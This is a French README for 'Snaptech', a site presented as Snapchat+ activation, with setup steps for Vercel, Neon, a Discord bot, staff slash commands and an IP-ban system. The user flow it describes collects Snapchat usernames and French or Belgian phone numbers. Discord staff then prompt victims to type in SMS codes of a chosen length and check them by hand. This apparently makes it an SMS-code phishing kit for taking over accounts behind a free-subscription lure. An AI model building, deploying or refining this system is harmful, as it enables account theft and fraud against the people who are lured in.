# 🎉 Snaptech — Snapchat+ Activation

> Plateforme d'activation Snapchat+ avec panel staff Discord, vérification de codes SMS et système de bannissement IP.

---

## ✨ Nouveautés v3.2

| Fonctionnalité | Description |
|---|---|
| 🎨 **Couleurs par opérateur** | Les embeds Discord changent de couleur selon l'opérateur : 🔴 SFR / Telenet, 🟠 Orange / Orange BE, 🔵 Bouygues / BASE, 🟣 Proximus, 🟡 Autre |
| 🚫 **Bouton Ban IP sur tous les embeds** | Disponible sur **chaque** embed (nouvelle demande, en cours, code soumis) |
| 🔒 **Ban IP corrigé** | Vérification du ban IP sur **tous** les endpoints API (`snapchat`, `status`, `verify-code`, `staff-action`) via middleware réutilisable |
| 📱 **Responsive mobile** | Design optimisé pour téléphone, tablette et PC |
| 🎯 **UI/UX améliorée** | Boutons plus intuitifs, animations fluides, lisibilité renforcée |

---

## 🏗️ Architecture

```
📁 snaptech/
├── index.html              → Page principale (formulaire)
├── validation.html         → Page de validation (attente staff)
├── code.html               → Page de saisie du code SMS
├── style.css               → Styles globaux (responsive)
├── script.js               → Logique formulaire
├── validation.js           → Polling statut
├── code.js                 → Saisie OTP
├── api/
│   ├── middleware.js       → Middleware réutilisable (getClientIP, checkBannedIP)
│   ├── snapchat.js         → API : enregistre demande + webhook Discord
│   ├── status.js           → API : retourne statut demande (polling)
│   ├── verify-code.js      → API : vérifie le code utilisateur
│   ├── staff-action.js     → API : actions staff (claim / set_length / true_code / false_code / wrong_number)
│   └── ban-ip.js           → API : bannissement d'IP
├── bot/
│   ├── bot.js              → Bot Discord (discord.js v14+)
│   ├── package.json        → Dépendances bot
│   ├── Dockerfile          → Pour Railway/Render
│   └── .env.example        → Variables bot
├── package.json            → Dépendances Vercel
├── vercel.json             → Routing Vercel
└── neon.sql                → Schéma base de données
```

---

## 🚀 Déploiement

### 1. Base de données Neon

1. Crée un projet sur [neon.tech](https://neon.tech)
2. Exécute `neon.sql` dans l'éditeur SQL
3. Copie la **Connection String**

### 2. Site Vercel

```bash
# Variables d'environnement Vercel :
DATABASE_URL=postgres://...
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
STAFF_SECRET=un_secret_long_et_aleatoire
```

### 3. Bot Discord (Railway/Render — PAS Vercel)

> ⚠️ Un bot Discord doit tourner en continu. Vercel est serverless (fonctions qui s'arrêtent). Héberge le bot sur **Railway** ou **Render**.

```bash
cd bot
# Crée un fichier .env avec les variables
npm install
npm start
```

**Variables du bot :**
```
DISCORD_BOT_TOKEN=...
DISCORD_CLIENT_ID=...
DISCORD_GUILD_ID=...
DISCORD_LOG_CHANNEL_ID=...
DATABASE_URL=... (même que le site)
STAFF_SECRET=... (même que le site)
API_BASE=https://snaptech.vercel.app
```

### 4. Config Discord

1. Crée une application sur [Discord Developer Portal](https://discord.com/developers/applications)
2. Crée un bot, copie le token
3. Ajoute le bot au serveur avec les scopes `bot` + `applications.commands`
4. Dans le serveur : `/config salon:#logs`

---

## 🔄 Flux utilisateur

1. **Utilisateur** remplit le formulaire → clic "Activer"
2. Redirection vers `validation.html` avec spinner
3. **API** enregistre en DB + envoie embed Discord coloré selon l'opérateur
4. **Staff** voit l'embed Discord → clic "📋 Prendre en charge"
5. **Staff** choisit 4 ou 6 chiffres
6. **Page validation** poll toutes les 3s → détecte `waiting_code` → redirige vers `code.html`
7. **Utilisateur** entre le code → API vérifie → `code_submitted`
8. **Discord** reçoit embed "Code soumis" avec boutons ✅/❌/🚫
9. **Staff** valide ou refuse le code
10. **Utilisateur** est redirigé vers `success.html` ou doit re-saisir

---

## 📊 Statuts

| Statut | Description |
|--------|-------------|
| `pending` | Demande reçue, en attente staff |
| `processing` | Staff a pris en charge |
| `waiting_code` | Staff a demandé un code à N chiffres |
| `code_submitted` | Utilisateur a soumis un code, en attente staff |
| `retry_code` | Code refusé par le staff, utilisateur doit re-saisir |
| `completed` | Code validé par le staff |
| `wrong_number` | Mauvais numéro signalé |

---

## 🎨 Couleurs des embeds Discord

| Opérateur | Couleur | Hex |
|-----------|---------|-----|
| SFR | 🔴 Rouge | `#E2001A` |
| Orange | 🟠 Orange | `#FF6600` |
| Bouygues | 🔵 Bleu | `#0099CC` |
| BASE | 🔵 Bleu | `#00A4E0` |
| Orange Belgium | 🟠 Orange | `#FF6600` |
| Proximus | 🟣 Violet | `#5C2D91` |
| Telenet | 🔴 Rouge | `#E2001A` |
| Autre | 🟡 Jaune | `#FFFC00` |

---

## 🚫 Système de bannissement IP

### Comment ça marche

1. Le staff clique sur **🚫 Ban IP** sur n'importe quel embed
2. L'IP est ajoutée à la table `banned_ips`
3. **Tous** les endpoints API vérifient l'IP via le middleware `checkBannedIP`
4. Un utilisateur banni reçoit une erreur `403 Access denied` sur toute requête API

### Commandes slash

| Commande | Description |
|----------|-------------|
| `/config salon:#logs` | Définit le salon de logs |
| `/panel` | Affiche le panel staff avec la légende des couleurs |
| `/claim phone:0612345678` | Prendre en charge une demande |
| `/setlength phone:0612345678 length:4` | Définir la longueur du code |
| `/wrongnumber phone:0612345678` | Signaler un mauvais numéro |
| `/banip ip:1.2.3.4` | Bannir une IP manuellement |

---

## 📱 Responsive

Le site est entièrement responsive :
- **Mobile** : padding réduit, tailles de police adaptées, pas de zoom iOS sur les inputs
- **Tablette** : layout aéré, cartes plus larges
- **PC** : design premium avec backdrop blur et ombres douces

---

## 🛡️ Sécurité

- Vérification du `STAFF_SECRET` sur toutes les actions staff
- Validation des numéros de téléphone (FR + BE)
- Validation du username Snapchat (3-15 caractères)
- Bannissement IP robuste avec récupération d'IP via `x-forwarded-for`
- Middleware réutilisable pour éviter la duplication de code

---

## 📦 Dépendances

**Site (Vercel) :**
- `@neondatabase/serverless`

**Bot (Railway/Render) :**
- `discord.js` v14+
- `@neondatabase/serverless`
- `dotenv`

---

*Snaptech © 2026 — Tous droits réservés*
